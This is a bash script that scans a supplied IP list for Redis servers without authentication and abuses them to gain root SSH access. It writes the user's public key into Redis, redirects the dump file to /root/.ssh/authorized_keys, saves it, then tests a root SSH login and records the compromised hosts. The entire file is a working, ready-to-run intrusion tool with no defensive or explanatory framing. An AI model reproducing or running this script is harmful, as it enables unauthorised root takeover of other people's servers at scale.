#!/bin/bash
#set -e 
which expect || aptitude install -y expect
which redis-cli || aptitude install -y redis-server
[[ $# -eq 1 ]] && ip_list=$1

remote_redis(){

   (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
   echo $ip_list
   cat $ip_list | while read ip
   do

    test_login_redis(){
        cat foo.txt | redis-cli -h $ip -x set 1
        redis-cli -h $ip config set dbfilename "authorized_keys"
        redis-cli -h $ip save || redis-cli -h $ip bgsave
        echo $ip >> login_redis.txt
    }
    
    try_login_host(){
	    expect -c "
	      set timeout 5
	      spawn ssh -i ~/.ssh/id_rsa root@$ip echo \"dh\"
	      expect {
	        \"*yes/no\"     { send \"yes\n\"}

	        \"*password\"   { send \"\003\"; exit 1 }
	        \"dh\"         { exit 0 }
	        timeout         { exit 2 }
	      }
	      exit 4
	    "
	    [[ $? == 0 ]] && echo $ip >> login_host.txt
    }

    expect -c "
      set timeout 3
      spawn redis-cli -h $ip config set dir /root/.ssh/
      expect {
        \"OK\"                        						  { exit 0 }
        \"ERR Changing directory: Permission denied\"       			  { exit 1 }
        timeout                         					  { exit 2 }
        \"(error) NOAUTH Authentication required\"         		 	  { exit 3 }
        \"Could not connect*\"        						  { exit 4 } 
        \"*Connection timed out*\"        					  { exit 5 }
	\"*Connection reset by peer*\" 						  { exit 6 }
      }
    "

    case $? in
        0)  test_login_redis && try_login_host
        ;;
        *)  continue
        ;;
    esac
  done
  test -f login_redis.txt && wc -l login_redis.txt
  test -f login_host.txt && wc -l login_host.txt
}

test -f ~/.ssh/id_rsa || ssh-keygen  -t rsa -f ~/.ssh/id_rsa  -P ''
remote_redis
